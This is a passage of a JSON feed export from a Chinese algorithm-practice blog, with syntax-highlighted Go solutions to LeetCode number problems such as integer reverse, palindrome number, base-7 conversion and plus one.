punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Init</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token comment\">// 维护堆的大小为 K</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> num <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> nums <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Push</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> h<span class=\"token punctuation\">.</span><span class=\"token function\">Len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> k <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\theap<span class=\"token punctuation\">.</span><span class=\"token function\">Pop</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token comment\">// 堆顶元素即为第 K 大的元素</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>h<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\tnums <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\tk <span class=\"token operator\">:=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\tkthLargest <span class=\"token operator\">:=</span> <span class=\"token function\">findKthLargest</span><span class=\"token punctuation\">(</span>nums<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"第%d大的元素为：%d\\n\"</span><span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> kthLargest<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 输出：第 3 大的元素为：6</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "算法训练2023",
                "数据结构",
                "算法"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/13_Number/",
            "url": "https://blog.twelveeee.top/2023/AlgorithmCamp2023/13_Number/",
            "title": "13-数字",
            "date_published": "2023-12-11T07:00:00.000Z",
            "content_html": "<h1 id=\"数字\"><a class=\"anchor\" href=\"#数字\">#</a> 数字</h1>\n<h2 id=\"数学统计\"><a class=\"anchor\" href=\"#数学统计\">#</a> 数学统计</h2>\n<h3 id=\"1-数组元素积的符号\"><a class=\"anchor\" href=\"#1-数组元素积的符号\">#</a> 1. 数组元素积的符号</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9zaWduLW9mLXRoZS1wcm9kdWN0LW9mLWFuLWFycmF5L2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/sign-of-the-product-of-an-array/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzEvdG9waWNfMS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_1/topic_1.go</span></p>\n<blockquote>\n<p>已知函数  <code>signFunc(x)</code>  将会根据  <code>x</code>  的正负返回特定值：</p>\n<ul>\n<li>如果  <code>x</code>  是正数，返回  <code>1</code>  。</li>\n<li>如果  <code>x</code>  是负数，返回  <code>-1</code>  。</li>\n<li>如果  <code>x</code>  是等于  <code>0</code>  ，返回  <code>0</code>  。</li>\n</ul>\n<p>给你一个整数数组  <code>nums</code>  。令  <code>product</code>  为数组  <code>nums</code>  中所有元素值的乘积。</p>\n<p>返回  <code>signFunc(product)</code>  。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">arraySign</span><span class=\"token punctuation\">(</span>nums <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token boolean\">_</span><span class=\"token punctuation\">,</span> num <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> nums <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> num <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> num <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\tans <span class=\"token operator\">*=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">return</span> ans</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h3>\n<h2 id=\"溢出问题\"><a class=\"anchor\" href=\"#溢出问题\">#</a> 溢出问题</h2>\n<h3 id=\"2-整数反转\"><a class=\"anchor\" href=\"#2-整数反转\">#</a> 2. 整数反转</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9yZXZlcnNlLWludGVnZXIvZGVzY3JpcHRpb24v\">https://leetcode.cn/problems/reverse-integer/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzEvdG9waWNfMi5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_1/topic_2.go</span></p>\n<blockquote>\n<p>给你一个 32 位的有符号整数  <code>x</code>  ，返回将  <code>x</code>  中的数字部分反转后的结果。</p>\n<p>如果反转后整数超过 32 位的有符号整数的范围  <code>[−231, 231 − 1]</code>  ，就返回 0。</p>\n<p><strong>假设环境不允许存储 64 位整数（有符号或无符号）。</strong></p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span>x <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tflag <span class=\"token operator\">:=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">if</span> x <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\tflag <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\tx <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>x</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">for</span> x <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> ans <span class=\"token operator\">>=</span> <span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span>MaxInt32<span class=\"token operator\">/</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\tans <span class=\"token operator\">=</span> ans<span class=\"token operator\">*</span><span class=\"token number\">10</span> <span class=\"token operator\">+</span> x<span class=\"token operator\">%</span><span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\tx <span class=\"token operator\">=</span> x <span class=\"token operator\">/</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token keyword\">return</span> ans <span class=\"token operator\">*</span> flag</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"3-回文数\"><a class=\"anchor\" href=\"#3-回文数\">#</a> 3. 回文数</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9wYWxpbmRyb21lLW51bWJlci8=\">https://leetcode.cn/problems/palindrome-number/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzEvdG9waWNfMy5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_1/topic_3.go</span></p>\n<blockquote>\n<p>给你一个整数  <code>x</code>  ，如果  <code>x</code>  是一个回文整数，返回  <code>true</code>  ；否则，返回  <code>false</code>  。</p>\n<p>回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p>\n<ul>\n<li>例如， <code>121</code>  是回文，而  <code>123</code>  不是。</li>\n</ul>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isPalindrome</span><span class=\"token punctuation\">(</span>x <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> x <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>x<span class=\"token operator\">%</span><span class=\"token number\">10</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> x <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tnum <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">for</span> x <span class=\"token operator\">></span> num <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tnum <span class=\"token operator\">=</span> num<span class=\"token operator\">*</span><span class=\"token number\">10</span> <span class=\"token operator\">+</span> x<span class=\"token operator\">%</span><span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tx <span class=\"token operator\">=</span> x <span class=\"token operator\">/</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">return</span> x <span class=\"token operator\">==</span> num <span class=\"token operator\">||</span> x <span class=\"token operator\">==</span> num<span class=\"token operator\">/</span><span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"-2\"><a class=\"anchor\" href=\"#-2\">#</a> </h3>\n<h2 id=\"进制问题\"><a class=\"anchor\" href=\"#进制问题\">#</a> 进制问题</h2>\n<h3 id=\"4-十进制转换成七进制\"><a class=\"anchor\" href=\"#4-十进制转换成七进制\">#</a> 4. 十进制转换成七进制</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9iYXNlLTcvZGVzY3JpcHRpb24v\">https://leetcode.cn/problems/base-7/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzEvdG9waWNfNC5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_1/topic_4.go</span></p>\n<blockquote>\n<p>给定一个整数  <code>num</code> ，将其转化为 <strong>7 进制</strong>，并以字符串形式输出。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">convertToBase7</span><span class=\"token punctuation\">(</span>num <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> num <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token string\">\"0\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">var</span> ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">if</span> num <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tnum <span class=\"token operator\">*=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\tflag <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">for</span> num <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\tans <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">,</span> <span class=\"token function\">byte</span><span class=\"token punctuation\">(</span><span class=\"token char\">'0'</span><span class=\"token operator\">+</span>num<span class=\"token operator\">%</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\tnum <span class=\"token operator\">=</span> num <span class=\"token operator\">/</span> <span class=\"token number\">7</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token keyword\">if</span> flag <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tans <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">,</span> <span class=\"token char\">'-'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\tans<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> ans<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ans<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> ans<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"5-七进制转换成十进制\"><a class=\"anchor\" href=\"#5-七进制转换成十进制\">#</a> 5.  七进制转换成十进制</h3>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">convertToBase10</span><span class=\"token punctuation\">(</span>num <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tcurr <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">for</span> num <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token comment\">// 个位数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\tdigit <span class=\"token operator\">:=</span> num <span class=\"token operator\">%</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tans <span class=\"token operator\">+=</span> digit <span class=\"token operator\">*</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>math<span class=\"token punctuation\">.</span><span class=\"token function\">Pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>curr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tcurr<span class=\"token operator\">++</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\tnum <span class=\"token operator\">/=</span> <span class=\"token number\">10</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">return</span> ans</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"数组加法\"><a class=\"anchor\" href=\"#数组加法\">#</a> 数组加法</h2>\n<h3 id=\"6-数组加一\"><a class=\"anchor\" href=\"#6-数组加一\">#</a> 6. 数组加一</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9wbHVzLW9uZS9kZXNjcmlwdGlvbi8=\">https://leetcode.cn/problems/plus-one/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzIvdG9waWNfMS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_2/topic_1.go</span></p>\n<blockquote>\n<p>给定一个由 <strong>整数</strong> 组成的 <strong>非空</strong> 数组所表示的非负整数，在该数的基础上加一。</p>\n<p>最高位数字存放在数组的首位， 数组中每个元素只存储<strong>单个</strong>数字。</p>\n<p>你可以假设除了整数 0 之外，这个整数不会以零开头。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">plusOne</span><span class=\"token punctuation\">(</span>digits <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">if</span> digits<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">9</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\tdigits<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> digits</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> digits<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">9</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\tdigits <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>digits<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\tdigits<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> digits<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">9</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\tdigits<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\tdigits<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">return</span> digits</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token 